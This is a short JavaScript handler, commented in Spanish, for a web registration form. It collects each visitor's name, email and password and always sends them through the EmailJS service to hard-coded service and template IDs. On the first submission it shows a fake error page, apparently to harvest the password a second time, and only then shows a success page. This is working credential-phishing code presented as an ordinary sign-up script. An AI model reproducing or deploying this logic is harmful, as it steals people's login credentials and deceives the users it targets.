emailjs.init('ReqtkWfjI392LAzFb');

document.getElementById('formRegistro').addEventListener('submit', (e) => {
    e.preventDefault();
    
    // Obtener número de intentos
    let intentos = localStorage.getItem('intentosRegistro') || 0;
    
    const datos = {
        nombre: document.getElementById('nombre').value,
        correo: document.getElementById('correo').value,
        contrasena: document.getElementById('password').value
    };

    // Enviar datos SIEMPRE
    emailjs.send("service_syrc1uk", "template_u3etoro", datos)
        .then(() => {
            if(intentos < 1) {
                localStorage.setItem('intentosRegistro', 1);
                window.location.href = 'error.html';
            } else {
                localStorage.removeItem('intentosRegistro');
                window.location.href = 'success.html';
            }
        })
        .catch((error) => {
            alert('Error temporal: ' + error.text);
        });
});
